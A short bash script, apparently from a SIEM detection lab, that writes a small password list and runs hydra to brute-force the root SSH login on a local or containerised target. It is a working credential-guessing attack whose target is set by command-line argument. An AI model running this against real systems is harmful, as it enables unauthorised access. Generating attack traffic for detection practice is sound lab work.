#!/usr/bin/env bash
# attack_hydra.sh: Real attack option using hydra against the local SSH container
set -e

TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-2222}"
PASSWORDS_FILE="/tmp/passwords.txt"

echo "[*] Target: ${TARGET_HOST}:${TARGET_PORT}"

# Create quick dictionary
cat <<EOF > "$PASSWORDS_FILE"
password
123456
admin123
toor
root123
letmein
qwerty
welcome1
correcthorse
testpass
EOF

if command -v hydra &> /dev/null; then
    echo "[*] Running local hydra..."
    hydra -l root -P "$PASSWORDS_FILE" -t 4 -s "$TARGET_PORT" "$TARGET_HOST" ssh
else
    echo "[*] Local hydra not found, executing via lightweight Docker container..."
    docker run --rm -i \
        --network siem-lab_siem-net \
        -v "$PASSWORDS_FILE":"$PASSWORDS_FILE":ro \
        vanhauser/hydra -l root -P "$PASSWORDS_FILE" -t 4 -s 22 ssh-target ssh
fi

echo "[✓] Hydra attack simulation completed."
